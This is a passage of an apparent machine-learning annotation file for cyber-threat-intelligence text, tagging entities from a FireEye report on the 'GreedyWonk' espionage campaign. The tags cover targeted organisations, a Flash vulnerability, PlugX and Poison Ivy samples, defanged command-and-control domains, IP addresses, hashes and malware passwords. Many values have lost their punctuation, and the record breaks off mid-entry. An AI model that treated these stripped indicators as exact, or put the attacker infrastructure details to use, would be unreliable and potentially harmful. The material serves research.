{"old_id": "T5", "type": "Campaign", "name": "GreedyWonk", "sent_id": 17, "pos": []}, {"old_id": "T6", "type": "Software", "name": "Flash", "sent_id": 9, "pos": [5]}, {"old_id": "T7", "type": "Time", "name": "Feb 13", "sent_id": 31, "pos": []}, {"old_id": "T8", "type": "Software", "name": "Adobe Flash", "sent_id": 31, "pos": []}, {"old_id": "T9", "type": "Software", "name": "Flash Player", "sent_id": 33, "pos": []}, {"old_id": "T10", "type": "ExploitTargetObject", "name": "wwwpiie[]com", "sent_id": null, "pos": []}, {"old_id": "T11", "type": "ExploitTargetObject", "name": "Peter G Peterson Institute for International Economics", "sent_id": null, "pos": []}, {"old_id": "T12", "type": "ExploitTargetObject", "name": "American Research Center in Egypt", "sent_id": null, "pos": []}, {"old_id": "T13", "type": "ExploitTargetObject", "name": "wwwarce[]org", "sent_id": 41, "pos": []}, {"old_id": "T14", "type": "ExploitTargetObject", "name": "Smith Richardson Foundation", "sent_id": null, "pos": []}, {"old_id": "T15", "type": "ExploitTargetObject", "name": "wwwsrf[]org", "sent_id": null, "pos": []}, {"old_id": "T16", "type": "ExploitTargetObject", "name": "Peterson Institute", "sent_id": null, "pos": []}, {"old_id": "T17", "type": "ExploitTargetObject", "name": "Smith Richardson Foundation", "sent_id": null, "pos": []}, {"old_id": "T18", "type": "SystemInformation", "name": "Windows XP", "sent_id": 52, "pos": []}, {"old_id": "T19", "type": "SystemInformation", "name": "Windows 7 and Java 16", "sent_id": null, "pos": []}, {"old_id": "T20", "type": "CourseOfAction", "name": "upgrading from Windows XP", "sent_id": null, "pos": []}, {"old_id": "T21", "type": "CourseOfAction", "name": "updating Java and Office", "sent_id": 56, "pos": []}, {"old_id": "T22", "type": "CourseOfAction", "name": "update Java to the latest 17 version", "sent_id": null, "pos": []}, {"old_id": "T23", "type": "CourseOfAction", "name": "update Microsoft Office to the latest version", "sent_id": null, "pos": []}, {"old_id": "T24", "type": "Campaign", "name": "GreedyWonk", "sent_id": 68, "pos": []}, {"old_id": "T25", "type": "Software", "name": "Adobe Flash", "sent_id": null, "pos": []}, {"old_id": "T26", "type": "Software", "name": "Windows XP", "sent_id": 77, "pos": []}, {"old_id": "T27", "type": "Exploit", "name": "return-oriented programming", "sent_id": null, "pos": []}, {"old_id": "T28", "type": "Software", "name": "Windows 7", "sent_id": null, "pos": []}, {"old_id": "T29", "type": "Exploit", "name": "hard-coded ROP chain", "sent_id": null, "pos": []}, {"old_id": "T30", "type": "Malware", "name": "MSVCR71dll", "sent_id": 84, "pos": []}, {"old_id": "T31", "type": "Malware", "name": "HXDSdll", "sent_id": 86, "pos": []}, {"old_id": "T32", "type": "Software", "name": "Microsoft Office 2007", "sent_id": null, "pos": []}, {"old_id": "T33", "type": "Software", "name": "Java 16", "sent_id": 88, "pos": []}, {"old_id": "T34", "type": "Malware", "name": "MSVCR71dll", "sent_id": null, "pos": []}, {"old_id": "T35", "type": "Organization", "name": "FireEye", "sent_id": 95, "pos": []}, {"old_id": "T36", "type": "CourseOfAction", "name": "upgrading to Java 17", "sent_id": null, "pos": []}, {"old_id": "T37", "type": "CourseOfAction", "name": "updating Microsoft Office 2007 and 2010", "sent_id": null, "pos": []}, {"old_id": "T38", "type": "MD5", "name": "507aed81e3106da8c50efb3a045c5e2b", "sent_id": 118, "pos": []}, {"old_id": "T39", "type": "Malware", "name": "PlugX", "sent_id": 117, "pos": []}, {"old_id": "T40", "type": "Malware", "name": "Kaba", "sent_id": 117, "pos": []}, {"old_id": "T41", "type": "Malware", "name": "PlugX", "sent_id": 120, "pos": [4]}, {"old_id": "T42", "type": "Time", "name": "Feb 12", "sent_id": 121, "pos": []}, {"old_id": "T43", "type": "Malware", "name": "PlugX", "sent_id": 125, "pos": []}, {"old_id": "T44", "type": "Indicator", "name": "javans1[]name", "sent_id": 127, "pos": []}, {"old_id": "T45", "type": "Indicator", "name": "adserviceno-ip[]org", "sent_id": null, "pos": []}, {"old_id": "T46", "type": "Indicator", "name": "wmins01[]us", "sent_id": 128, "pos": []}, {"old_id": "T47", "type": "Indicator", "name": "javans1[]name", "sent_id": 138, "pos": []}, {"old_id": "T48", "type": "Indicator", "name": "adserviceno-ip[]org", "sent_id": null, "pos": []}, {"old_id": "T49", "type": "Address", "name": "7412617768", "sent_id": 139, "pos": []}, {"old_id": "T50", "type": "Time", "name": "Feb 18 2014", "sent_id": null, "pos": []}, {"old_id": "T51", "type": "Indicator", "name": "wmins01us", "sent_id": null, "pos": []}, {"old_id": "T52", "type": "Address", "name": "103246246103", "sent_id": null, "pos": []}, {"old_id": "T53", "type": "Time", "name": "between July 4 2013 and July 15 2013", "sent_id": 143, "pos": []}, {"old_id": "T54", "type": "Address", "name": "19274246219", "sent_id": 144, "pos": []}, {"old_id": "T55", "type": "Time", "name": "Feb 17 2014", "sent_id": null, "pos": []}, {"old_id": "T56", "type": "Indicator", "name": "javans1[]name", "sent_id": 145, "pos": []}, {"old_id": "T57", "type": "Address", "name": "19274246219", "sent_id": 146, "pos": []}, {"old_id": "T58", "type": "Time", "name": "February 18", "sent_id": 146, "pos": []}, {"old_id": "T59", "type": "Indicator", "name": "adserviceno-ip[]org", "sent_id": null, "pos": []}, {"old_id": "T60", "type": "Indicator", "name": "javans1[]name", "sent_id": 147, "pos": []}, {"old_id": "T61", "type": "Indicator", "name": "javans1[]name", "sent_id": 147, "pos": []}, {"old_id": "T62", "type": "Indicator", "name": "wmins01[]us", "sent_id": null, "pos": []}, {"old_id": "T63", "type": "Indicator", "name": "proxyddns[]info", "sent_id": 148, "pos": []}, {"old_id": "T64", "type": "Time", "name": "2014-02-18", "sent_id": 149, "pos": []}, {"old_id": "T65", "type": "Time", "name": "2014-02-18", "sent_id": 149, "pos": []}, {"old_id": "T66", "type": "Time", "name": "2014-02-18", "sent_id": 149, "pos": []}, {"old_id": "T67", "type": "Time", "name": "2014-02-17", "sent_id": null, "pos": []}, {"old_id": "T68", "type": "Time", "name": "2013-05-02", "sent_id": 150, "pos": []}, {"old_id": "T69", "type": "Time", "name": "2014-02-19", "sent_id": 150, "pos": []}, {"old_id": "T70", "type": "Time", "name": "2014-02-19", "sent_id": 151, "pos": []}, {"old_id": "T71", "type": "Time", "name": "2014-02-18", "sent_id": 151, "pos": []}, {"old_id": "T72", "type": "Time", "name": "2014-02-17", "sent_id": 151, "pos": []}, {"old_id": "T73", "type": "Time", "name": "2014-02-18", "sent_id": 152, "pos": []}, {"old_id": "T74", "type": "Address", "name": "7412617768", "sent_id": null, "pos": []}, {"old_id": "T75", "type": "Address", "name": "7412617768", "sent_id": 153, "pos": []}, {"old_id": "T76", "type": "Address", "name": "19274246219", "sent_id": 153, "pos": []}, {"old_id": "T77", "type": "Address", "name": "19274246219", "sent_id": null, "pos": []}, {"old_id": "T78", "type": "Address", "name": "103246246103", "sent_id": 154, "pos": []}, {"old_id": "T79", "type": "Indicator", "name": "updatednsns02[]us", "sent_id": null, "pos": []}, {"old_id": "T80", "type": "Time", "name": "2013-09-06", "sent_id": 155, "pos": []}, {"old_id": "T81", "type": "Indicator", "name": "updatednsns01[]us", "sent_id": null, "pos": []}, {"old_id": "T82", "type": "Time", "name": "2013-09-06", "sent_id": 156, "pos": []}, {"old_id": "T83", "type": "Indicator", "name": "wmins01[]us", "sent_id": 156, "pos": []}, {"old_id": "T84", "type": "Time", "name": "2013-07-04", "sent_id": null, "pos": []}, {"old_id": "T85", "type": "Time", "name": "2013-09-06", "sent_id": 157, "pos": []}, {"old_id": "T86", "type": "Time", "name": "2013-09-06", "sent_id": 157, "pos": []}, {"old_id": "T87", "type": "Time", "name": "2013-07-15", "sent_id": 158, "pos": []}, {"old_id": "T88", "type": "Address", "name": "103246246103", "sent_id": 158, "pos": []}, {"old_id": "T89", "type": "Address", "name": "103246246103", "sent_id": null, "pos": []}, {"old_id": "T90", "type": "Address", "name": "103246246103", "sent_id": 159, "pos": []}, {"old_id": "T91", "type": "Indicator", "name": "wmins01[]us", "sent_id": 161, "pos": []}, {"old_id": "T92", "type": "MD5", "name": "7995a9a6a889b914e208eb924e459ebc", "sent_id": null, "pos": []}, {"old_id": "T93", "type": "MD5", "name": "bf60b8d26bc0c94dda2e3471de6ec977", "sent_id": null, "pos": []}, {"old_id": "T94", "type": "MD5", "name": "fd69793bd63c44bbb22f9c4d46873252", "sent_id": null, "pos": []}, {"old_id": "T95", "type": "Malware", "name": "PlugX", "sent_id": 163, "pos": []}, {"old_id": "T96", "type": "Malware", "name": "PlugX", "sent_id": 165, "pos": []}, {"old_id": "T97", "type": "Malware", "name": "Poison", "sent_id": null, "pos": []}, {"old_id": "T98", "type": "Malware", "name": "Poison", "sent_id": 169, "pos": []}, {"old_id": "T99", "type": "Malware", "name": "Poison", "sent_id": 170, "pos": [4]}, {"old_id": "T100", "type": "Indicator", "name": "fuckchinagovnb[]com", "sent_id": null, "pos": []}, {"old_id": "T101", "type": "Indicator", "name": "microsafesno-ip[]org", "sent_id": 166, "pos": []}, {"old_id": "T102", "type": "Time", "name": "2010-03-15", "sent_id": null, "pos": []}, {"old_id": "T103", "type": "Time", "name": "2012-06-09", "sent_id": 163, "pos": []}, {"old_id": "T104", "type": "Time", "name": "2013-03-07", "sent_id": 168, "pos": []}, {"old_id": "T105", "type": "Time", "name": "2012-06-11", "sent_id": 169, "pos": []}, {"old_id": "T106", "type": "Time", "name": "2012-06-11", "sent_id": 171, "pos": []}, {"old_id": "T107", "type": "Indicator", "name": "fuckchinagovnb[]com", "sent_id": null, "pos": []}, {"old_id": "T108", "type": "Time", "name": "2013-12-11", "sent_id": 173, "pos": []}, {"old_id": "T109", "type": "Time", "name": "2013-12-11", "sent_id": 173, "pos": []}, {"old_id": "T110", "type": "Address", "name": "204200222136", "sent_id": 174, "pos": []}, {"old_id": "T111", "type": "Time", "name": "2014-02-12", "sent_id": null, "pos": []}, {"old_id": "T112", "type": "Indicator", "name": "microsafesno-ip[]org", "sent_id": 174, "pos": []}, {"old_id": "T113", "type": "Time", "name": "2014-02-12", "sent_id": 175, "pos": []}, {"old_id": "T114", "type": "Address", "name": "7412617770", "sent_id": 175, "pos": []}, {"old_id": "T115", "type": "Indicator", "name": "microsafesno-ip[]org", "sent_id": null, "pos": []}, {"old_id": "T116", "type": "Time", "name": "2013-12-04", "sent_id": 176, "pos": []}, {"old_id": "T117", "type": "Time", "name": "2013-12-04", "sent_id": null, "pos": []}, {"old_id": "T118", "type": "Address", "name": "74126177241", "sent_id": 177, "pos": []}, {"old_id": "T119", "type": "Malware", "name": "Poison Ivy", "sent_id": 177, "pos": []}, {"old_id": "T120", "type": "Indicator", "name": "domain wmins01[]us", "sent_id": null, "pos": []}, {"old_id": "T121", "type": "MD5", "name": "88b375e3b5c50a3e6c881bc96c926928", "sent_id": null, "pos": []}, {"old_id": "T122", "type": "MD5", "name": "cd07a9e49b1f909e1bd9e39a7a6e56b4", "sent_id": null, "pos": []}, {"old_id": "T123", "type": "MD5", "name": "fd69793bd63c44bbb22f9c4d46873252", "sent_id": null, "pos": []}, {"old_id": "T124", "type": "MD5", "name": "88b375e3b5c50a3e6c881bc96c926928", "sent_id": null, "pos": []}, {"old_id": "T125", "type": "MD5", "name": "cd07a9e49b1f909e1bd9e39a7a6e56b4", "sent_id": null, "pos": []}, {"old_id": "T126", "type": "Password", "name": "java7", "sent_id": 180, "pos": []}, {"old_id": "T127", "type": "Password", "name": "admin", "sent_id": 182, "pos": []}, {"old_id": "T128", "type": "Password", "name": "admin", "sent_id": 183, "pos": []}, {"old_id": "T129", "type": "MD5", "name": "8936c87a08ffa56d19fdb87588e35952", "sent_id": null, "pos": []}, {"old_id": "T130", "type": "Malware", "name": "Poison Ivy", "sent_id": 185, "pos": []}, {"old_id": "T131", "type": "Password", "name": "java7", "sent_id": 187, "pos": []}, {"old_id": "T132", "type": "Software", "name": "Adobe Flash", "sent_id": 188, "pos": []}, {"old_id": "T133", "type": "Vulnerability", "name": "CVE-2012-0779", "sent_id": null, "pos": []}, {"old_id": "T134", "type": "ExploitTargetObject", "name": "Center for Defense Information", "sent_id": null, "pos": []}, {"old_id": "T135", "type": "ExploitTargetObject", "name": "wwwcdi[]org", "sent_id": null, "pos": []}, {"old_id": "T136", "type": "Address", "name": "159546292", "sent_id": null, "pos": []}, {"old_id": "T137", "type": "File", "name": "BrightBallsswf", "sent_id": 196, "pos": []}, {"old_id": "T138", "type": "MD5", "name": "1", "sent_id": 197, "pos": []}, {"old_id": "T139", "type": "Malware", "name": "Poison Ivy", "sent_id": 199, "pos": []}, {"old_id": "T140", "type": "Password", "name": "java7", "sent_id": 200, "pos": []}, {"old_id": "T141", "type": "Indicator", "name": "YFds*&^ff", "sent_id": 203, "pos": []}, {"old_id": "T142", "type": "Indicator", "name": "windowsddns[]us", "sent_id": null, "pos": []}, {"old_id": "T143", "type": "Indicator", "name": "windowsddns[]us", "sent_id": null, "pos": []}, {"old_id": "T144", "type": "Indicator", "name": "wmins01[]us", "sent_id": 206, "pos": []}, {"old_id": "T145", "type": "Address", "name": "767380188", "sent_id": 207, "pos": []}, {"old_id": "T146", "type": "Time", "name": "mid-2012", "sent_id": 207, "pos": []}, {"old_id": "T147", "type": "Indicator", "name": "wmins01us", "sent_id": null, "pos": []}, {"old_id": "T148", "type": "Indicator", "name": "windowsddnsus", "sent_id": 208, "pos": []}, {"old_id": "T149", "type": "Time", "name": "2012-07-07", "sent_id": null, "pos": []}, {"old_id": "T150", "type": "Time", "name": "2012-05-23", "sent_id": 209, "pos": []}, {"old_id": "T151", "type": "Time", "name": "2012-09-19", "sent_id": null, "pos": []}, {"old_id": "T152", "type": "Time", "name": "2012-06-10", "sent_id": 210, "pos": []}, {"old_id": "T153", "type": "Address", "name": "767380188", "sent_id": null, "pos": []}, {"old_id": "T154", "type": "MD5", "name": "7d810e3564c4eb95bcb3d11ce191208e", "sent_id": null, "pos": []}, {"old_id": "T155", "type": "Vulnerability", "name": "CVE-2012-0507", "sent_id": null, "pos": []}, {"old_id": "T156", "type": "MD5", "name": "52aa791a524b61b129344f10b4712f52", "sent_id": null, "pos": []}, {"old_id": "T157", "type": "Malware", "name": "Poison Ivy", "sent_id": 217, "pos": []}, {"old_id": "T158", "type": "Malware", "name": "Poison Ivy", "sent_id": 219, "pos": []}, {"old_id": "T159", "type": "Indicator", "name": "idsns01[]us", "sent_id": 220, "pos": []}, {"old_id": "T160", "type": "Indicator", "name": "idsns01[]us", "sent_id": 221, "pos": []}, {"old_id": "T161", "type": "Indicator", "name": "wmins01[]us", "sent_id": null, "pos": []}, {"old_id": "T162", "type": "Address", "name": "19418322475", "sent_id": null, "pos": []}, {"old_id": "T163", "type": "Indicator", "name": "wmins01[]us", "sent_id": 224, "pos": []}, {"old_id": "T164", "type": "Indicator", "name": "idsns01[]us", "sent_id": null, "pos": []}, {"old_id": "T165", "type": "Time", "name": "2012-07-03", "sent_id": 225, "pos": []}, {"old_id": "T166", "type": "Time", "name": "2012-04-23", "sent_id": null, "pos": []}, {"old_id": "T167", "type": "Time", "name": "2012-07-04", "sent_id": 226, "pos": []}, {"old_id": "T168", "type": "Time", "name": "2012-05-18", "sent_id": 226, "pos": []}, {"old_id": "T169", "type": "Address", "name": "19418322475", "sent_id": 227, "pos": []}, {"old_id": "T170", "type": "Address", "name": "19418322475", "sent_id": 227, "pos": []}, {"old_id": "T171", "type": "MD5", "name": "fd69793bd63c44bbb22f9c4d46873252", "sent_id": 228, "pos": []}, {"old_id": "T172", "type": "ExploitTargetObject", "name": "Center for European Policy Studies", "sent_id": null, "pos": []}, {"old_id": "T173", "type": "Malware", "name": "Poison Ivy", "sent_id": null, "pos": []}, {"old_id": "T174", "type": "ExploitTargetObject", "name": "wwwceps[]be", "sent_id": 231, "pos": []}, {"old_id": "T175", "type": "ExploitTargetObject", "name": "wwwceps[]be", "sent_id": null, "pos": []}, {"old_id": "T176", "type": "Indicator", "name": "shopfujifilm[]be", "sent_id": null, "pos": []}, {"old_id": "T177", "type": "ExploitTargetObject", "name": "wwwarce[]org", "sent_id": null, "pos": []}], "labels": [{"old_id": "R1", "r": "P19", "h": 5, "t": 2, "evidence": []}, {"old_id": "R2", "r": "P27", "h": 4, "t": 9, "evidence": []}, {"old_id": "R3", "r": "P27", "h": 4, "t": 10, "evidence": []}, {"old_id": "R4", "r": "P27", "h": 4, "t": 11, "evidence": []}, {"old_id": "R5", "r": "P27", "h": 4, "t": 12, "evidence": [17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41]}, {"old_id": "R6", "r": "P27", "h": 4, "t": 13, "evidence": []}, {"old_id": "R7", "r": "P27", "h": 4, "t": 14, "evidence": []}, {"old_id": "R8", "r": "P27", "h": 4, "t": 15, "evidence": []}, {"old_id": "R9", "r": "P27", "h": 4, "t": 16, "evidence": []}, {"old_id": "R10", "r": "P34", "h": 22, "t": 23, "evidence": []}, {"old_id": "R11", "r": "P34", "h": 21, "t": 23, "evidence": []}, {"old_id": "R12", "r": "P34", "h": 19, "t": 23, "evidence": []}, {"old_id": "R13", "r": "P34", "h": 20, "t": 23, "evidence": [56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68]}, {"old_id": "R14", "r": "P22", "h": 23, "t": 26, "evidence": []}, {"old_id": "R15", "r": "P22", "h": 23, "t": 28, "evidence": []}, {"old_id": "R16", "r": "P22", "h": 23, "t": 29, "evidence": [68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84]}, {"old_id": "R17", "r": "P22", "h": 23, "t": 30, "evidence": [68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86]}, {"old_id": "R18", "r": "P34", "h": 35, "t": 23, "evidence": []}, {"old_id": "R19", "r": "P34", "h": 36, "t": 23, "evidence": []}, {"old_id": "R20", "r": "P21", "h": 37, "t": 38, "evidence": []}, {"old_id": "R21", "r": "P21", "h": 37, "t": 39, "evidence": []}, {"old_id": "R22", "r": "P33", "h": 40, "t": 41, "evidence": [120, 121]}, {"old_id": "R23", "r": "P21", "h": 43, "t": 42, "evidence": []}, {"old_id": "R24", "r": "P21", "h": 44, "t": 42, "evidence": []}, {"old_id": "R25", "r": "P21", "h": 45, "t": 42, "evidence": []}, {"old_id": "R26", "r": "P21", "h": 119, "t": 118, "evidence": []}, {"old_id": "R27", "r": "P21", "h": 120, "t": 97, "evidence": []}, {"old_id": "R28", "r": "P33", "h": 97, "t": 104, "evidence": [169]}, {"old_id": "R29", "r": "P33", "h": 96, "t": 103, "evidence": []}, {"old_id": "R30", "r": "P21", "h": 93, "t": 96, "evidence": []}, {"old_id": "R31", "r": "P21", "h": 121, "t": 98, "evidence": []}, {"old_id": "R32", "r": "P33", "h": 98, "t": 105, "evidence": [170, 171]}, {"old_id": "R33", "r": "P21", "h": 91, "t": 94, "evidence": []}, {"old_id": "R34", "r": "P33", "h": 94, "t": 102, "evidence": [163]}, {"old_id": "R35", "r": "P21", "h": 99, "t": 94, "evidence": []}, {"old_id": "R36", "r": "P21", "h": 92, "t": 95, "evidence": []}, {"old_id": "R37", "r": "P21", "h": 100, "t": 95, "evidence": []}, {"old_id": "R38", "r": "P33", "h": 95, "t": 101, "evidence": []}, {"old_id": "R39", "r": "P21", "h": 122, "t": 118, "evidence": []}, {"old_id": "R40", "r": "P21", "h": 123, "t": 118, "evidence": []}, {"old_id": "R41", "r": "P21", "h": 124, "t": 118, "evidence": []}, {"old_id": "R42", "r": "P21", "h": 128, "t": 129, "evidence": []}, {"old_id": "R43", "r": "P19", "h": 131, "t": 132, "evidence": []}, {"old_id": "R44", "r": "P7", "h": 129, "t": 132, "evidence": []}, {"old_id": "R45", "r": "P21", "h": 136, "t": 129, "evidence": []}, {"old_id": "R46", "r": "P21", "h": 137, "t": 129, "evidence": []}, {"old_id": "R47", "r": "P21", "h": 140, "t": 138, "evidence": []}, {"old_id": "R48", "r": "P21", "h": 141, "t": 138, "evidence": []}, {"old_id": "R49", "r": "P21", "h": 142, "t": 138, "evidence": []}, {"old_id": "R50", "r": "P21", "h": 143, "t": 138, "evidence": []}, {"old_id": "R51", "r": "P33", "h": 138, "t": 145, "evidence": [199, 200, 201, 202, 203, 204, 205, 206, 207]}, {"old_id": "R52", "r": "P28", "h": 138, "t": 144, "evidence": [199, 200, 201, 202, 203, 204, 205, 206, 207]}, {"old_id": "R53", "r": "P7", "h": 156, "t": 154, "evidence": []}, {"old_id": "R54", "r": "P21", "h": 153, "t": 156, "evidence": []}, {"old_id": "R55", "r": "P21", "h": 155, "t": 156, "evidence": []}, {"old_id": "R56", "r": "P21", "h": 159, "t": 157, "evidence": []}, {"old_id": "R57", "r": "P21", "h": 158, "t": 157, "evidence": []}, {"old_id": "R58", "r": "P21", "h": 175, "t": 172, "evidence": []}, {"old_id": "R59", "r": "P21", "h": 170, "t": 172, "evidence": []}], "title": ["inputs/txt/201402FireEyeGreedyWonk"], "sents": [["T1", "Campaign", "10", "20", "GreedyWonk"], ["T2", "Campaign", "156", "163", "SnowMan"], ["T3", "Vulnerability", "410", "422", "CVE-20140502"], ["T4", "Campaign", "718", "738", "Operation", "GreedyWonk"], ["T5", "Campaign", "752", "762", "GreedyWonk"], ["T6", "Software", "309", "314", "Flash"], ["R1", "hasVulnerability", "Arg1:T6", "Arg2:T3"], ["T7", "Time", "1355", "1362", "Feb", ".", "13"], ["T8", "Software", "1394", "1405", "Adobe", "Flash"], ["T9", "Software", "1453", "1458;1459", "1465", "Flash", "Player"], ["T10", "ExploitTargetObject", "1568", "1582", "www", ".", "piie[.]com"], ["R2", "targets", "Arg1:T5", "Arg2:T10"], ["T11", "ExploitTargetObject", "1511", "1566", "Peter", "G", ".", "Peterson", "Institute", "for", "International", "Economics"], ["R3", "targets", "Arg1:T5", "Arg2:T11"], ["T12", "ExploitTargetObject", "1705", "1738", "American", "Research", "Center", "in", "Egypt"], ["T13", "ExploitTargetObject", "1740", "1754", "www", ".", "arce[.]org"], ["T14", "ExploitTargetObject", "1764", "1769;1770", "1791", "Smith", "Richardson", "Foundation"], ["T15", "ExploitTargetObject", "1793", "1806", "www", ".", "srf[.]org"], ["T16", "ExploitTargetObject", "1909", "1927", "Peterson", "Institute"], ["T17", "ExploitTargetObject", "1932", "1959", "Smith", "Richardson", "Foundation"], ["R4", "targets", "Arg1:T5", "Arg2:T12"], ["R5", "targets", "Arg1:T5", "Arg2:T13"], ["R6", "targets", "Arg1:T5", "Arg2:T14"], ["R7", "targets", "Arg1:T5", "Arg2:T15"], ["R8", "targets", "Arg1:T5", "Arg2:T16"], ["R9", "targets", "Arg1:T5", "Arg2:T17"], ["T18", "SystemInformation", "2173", "2183", "Windows", "XP"], ["T19", "SystemInformation", "2184", "2206", "Windows", "7", "and", "Java", "1", ".", "6"], ["T20", "CourseOfAction", "2312", "2337", "upgrading", "from", "Windows", "XP"], ["T21", "CourseOfAction", "2342", "2366", "updating", "Java", "and", "Office"], ["T22", "CourseOfAction", "2390", "2427", "update", "Java", "to", "the", "latest", "1", ".", "7", "version"], ["T23", "CourseOfAction", "2492", "2537", "update", "Microsoft", "Office", "to", "the", "latest", "version"], ["T24", "Campaign", "2742", "2752", "GreedyWonk"], ["R10", "mitigates", "Arg1:T23", "Arg2:T24"], ["R11", "mitigates", "Arg1:T22", "Arg2:T24"], ["R12", "mitigates", "Arg1:T20", "Arg2:T24"], ["R13", "mitigates", "Arg1:T21", "Arg2:T24"], ["T25", "Software", "2799", "2810", "Adobe", "Flash"], ["T26", "Software", "3110", "3120", "Windows", "XP"], ["T27", "Exploit", "3144", "3171", "return-oriented", "programming"], ["T28", "Software", "3309", "3318", "Windows", "7"], ["T29", "Exploit", "3340", "3360", "hard-coded", "ROP", "chain"], ["T30", "Malware", "3365", "3376", "MSVCR71", ".", "dll"], ["T31", "Malware", "3455", "3463", "HXDS", ".", "dll"], ["T32", "Software", "3508", "3529", "Microsoft", "Office", "2007"], ["T33", "Software", "3539", "3547", "Java", "1", ".", "6"], ["T34", "Malware", "3629", "3640", "MSVCR71", ".", "dll"], ["R14", "involvesMalware", "Arg1:T24", "Arg2:T27"], ["R15", "involvesMalware", "Arg1:T24", "Arg2:T29"], ["R16", "involvesMalware", "Arg1:T24", "Arg2:T30"], ["R17", "involvesMalware", "Arg1:T24", "Arg2:T31"], ["T35", "Organization", "3745", "3752", "FireEye"], ["T36", "CourseOfAction", "3773", "3794", "upgrading", "to", "Java", "1", ".", "7"], ["R18", "mitigates", "Arg1:T36", "Arg2:T24"], ["T37", "CourseOfAction", "4017", "4056", "updating", "Microsoft", "Office", "2007", "and", "2010"], ["R19", "mitigates", "Arg1:T37", "Arg2:T24"], ["T38", "MD5", "4578", "4610", "507aed81e3106da8c50efb3a045c5e2b"], ["T39", "Malware", "4516", "4521", "PlugX"], ["T40", "Malware", "4522", "4526", "Kaba"], ["R20", "indicates", "Arg1:T38", "Arg2:T39"], ["R21", "indicates", "Arg1:T38", "Arg2:T40"], ["T41", "Malware", "4658", "4663", "PlugX"], ["T42", "Time", "4687", "4694", "Feb", ".", "12"], ["R22", "hasAttackTime", "Arg1:T41", "Arg2:T42"], ["T43", "Malware", "4802", "4807", "PlugX"], ["T44", "Indicator", "4885", "4900", "java", ".", "ns1[.]name"], ["T45", "Indicator", "4901", "4922", "adservice", ".", "no-ip[.]org"], ["T46", "Indicator", "4923", "4936", "wmi", ".", "ns01[.]us"], ["R23", "indicates", "Arg1:T44", "Arg2:T43"], ["R24", "indicates", "Arg1:T45", "Arg2:T43"], ["R25", "indicates", "Arg1:T46", "Arg2:T43"], ["T47", "Indicator", "5274", "5289", "java", ".", "ns1[.]name"], ["T48", "Indicator", "5294", "5315", "adservice", ".", "no-ip[.]org"], ["T49", "Address", "5328", "5341", "74", ".", "126.177.68"], ["T50", "Time", "5345", "5358", "Feb", ".", "18", ",", "2014"], ["T51", "Indicator", "5405", "5416", "wmi", ".", "ns01.us"], ["T52", "Address", "5440", "5455", "103", ".", "246.246.103"], ["T53", "Time", "5456", "5471;5472", "5494", "between", "July", "4", ",", "2013", "and", "July", "15", ",", "2013"], ["T54", "Address", "5499", "5513", "192", ".", "74.246.219"], ["T55", "Time", "5517", "5530", "Feb", ".", "17", ",", "2014"], ["T56", "Indicator", "5532", "5547", "java", ".", "ns1[.]name"], ["T57", "Address", "5565", "5579", "192", ".", "74.246.219"], ["T58", "Time", "5583", "5594", "February", "18"], ["T59", "Indicator", "5603", "5624", "adservice", ".", "no-ip[.]org"], ["T60", "Indicator", "5625", "5640", "java", ".", "ns1[.]name"], ["T61", "Indicator", "5641", "5656", "java", ".", "ns1[.]name"], ["T62", "Indicator", "5657", "5670", "wmi", ".", "ns01[.]us"], ["T63", "Indicator", "5671", "5688", "proxy", ".", "ddns[.]info"], ["T64", "Time", "5701", "5711", "2014-02-18"], ["T65", "Time", "5712", "5722", "2014-02-18"], ["T66", "Time", "5723", "5733", "2014-02-18"], ["T67", "Time", "5734", "5744", "2014-02-17"], ["T68", "Time", "5745", "5755", "2013-05-02"], ["T69", "Time", "5767", "5777", "2014-02-19"], ["T70", "Time", "5778", "5788", "2014-02-19"], ["T71", "Time", "5789", "5799", "2014-02-18"], ["T72", "Time", "5800", "5810", "2014-02-17"], ["T73", "Time", "5811", "5821", "2014-02-18"], ["T74", "Address", "5834", "5847", "74", ".", "126.177.68"], ["T75", "Address", "5848", "5861", "74", ".", "126.177.68"], ["T76", "Address", "5862", "5876", "192", ".", "74.246.219"], ["T77", "Address", "5877", "5891", "192", ".", "74.246.219"], ["T78", "Address", "5892", "5907", "103", ".", "246.246.103"], ["T79", "Indicator", "5910", "5929", "updatedns", ".", "ns02[.]us"], ["T80", "Time", "5930", "5940", "2013-09-06"], ["T81", "Indicator", "5941", "5960", "updatedns", ".", "ns01[.]us"], ["T82", "Time", "5961", "5971", "2013-09-06"], ["T83", "Indicator", "5972", "5985", "wmi", ".", "ns01[.]us"], ["T84", "Time", "5986", "5996", "2013-07-04"], ["T85", "Time", "5998", "6008", "2013-09-06"], ["T86", "Time", "6009", "6019", "2013-09-06"], ["T87", "Time", "6020", "6030", "2013-07-15"], ["T88", "Address", "6032", "6047", "103", ".", "246.246.103"], ["T89", "Address", "6048", "6063", "103", ".", "246.246.103"], ["T90", "Address", "6064", "6079", "103", ".", "246.246.103"], ["T91", "Indicator", "6172", "6185", "wmi", ".", "ns01[.]us"], ["T92", "MD5", "6226", "6258", "7995a9a6a889b914e208eb924e459ebc"], ["T93", "MD5", "6298", "6330", "bf60b8d26bc0c94dda2e3471de6ec977"], ["T94", "MD5", "6371", "6403", "fd69793bd63c44bbb22f9c4d46873252"], ["T95", "Malware", "6259", "6264", "PlugX"], ["T96", "Malware", "6331", "6336", "PlugX"], ["T97", "Malware", "6404", "6410", "Poison"], ["T98", "Malware", "6463", "6469", "Poison"], ["T99", "Malware", "6522", "6528", "Poison"], ["T100", "Indicator", "6276", "6297", "fuckchina", ".", "govnb[.]com"], ["T101", "Indicator", "6348", "6370", "microsafes", ".", "no-ip[.]org"], ["T102", "Time", "6337", "6347", "2010-03-15"], ["T103", "Time", "6265", "6275", "2012-06-09"], ["T104", "Time", "6411", "6421", "2013-03-07"], ["T105", "Time", "6470", "6480", "2012-06-11"], ["T106", "Time", "6529", "6539", "2012-06-11"], ["T107", "Indicator", "6587", "6608", "fuckchina", ".", "govnb[.]com"], ["T108", "Time", "6609", "6619", "2013-12-11"], ["T109", "Time", "6620", "6630", "2013-12-11"], ["T110", "Address", "6631", "6646", "204", ".", "200.222.136"], ["T111", "Time", "6670", "6680", "2014-02-12"], ["T112", "Indicator", "6647", "6669", "microsafes", ".", 